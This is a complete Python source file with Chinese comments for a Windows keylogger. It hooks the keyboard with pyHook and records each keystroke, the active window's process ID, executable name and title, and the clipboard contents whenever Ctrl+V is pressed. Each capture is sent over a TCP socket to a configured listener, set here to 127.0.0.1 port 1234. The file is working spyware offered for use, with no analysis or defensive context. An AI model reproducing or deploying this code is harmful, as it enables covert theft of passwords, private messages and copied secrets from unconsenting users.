#!coding:utf-8
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import socket
 
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
msg            = '' 

# 将得到的消息发送回
def send_message(msg):
    target_host = "127.0.0.1"
    target_port = 1234

    if len(msg) > 0:
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect((target_host,target_port))
        client.sendall(msg)
        client.close()

def get_current_process():
 
    global msg

    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
 
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
 
    process_id = "{0}".format(pid.value)
 
    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
 
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    msg = "[PID:{0}-{1}-{2}]".format(process_id,executable.value,windows_title.value)
    send_message(msg)

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
 
# 定义击键监听事件函数
def KeyStroke(event):
 
    global msg
    global current_window
 
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
 
    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        msg += chr(event.Ascii)
        send_message(msg)
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            msg = "[PASTE]-{0}".format(pasted_value)
            send_message(msg)
        else:
            msg = "[{0}]".format(event.Key)
            send_message(msg)

    # 循环监听下一个击键事件
    return True

if __name__ == '__main__':

    # 创建hook句柄并注册hook管理器
    start = pyHook.HookManager()
    start.KeyDown = KeyStroke
 
    start.HookKeyboard()

    #循环获取消息
    pythoncom.PumpMessages()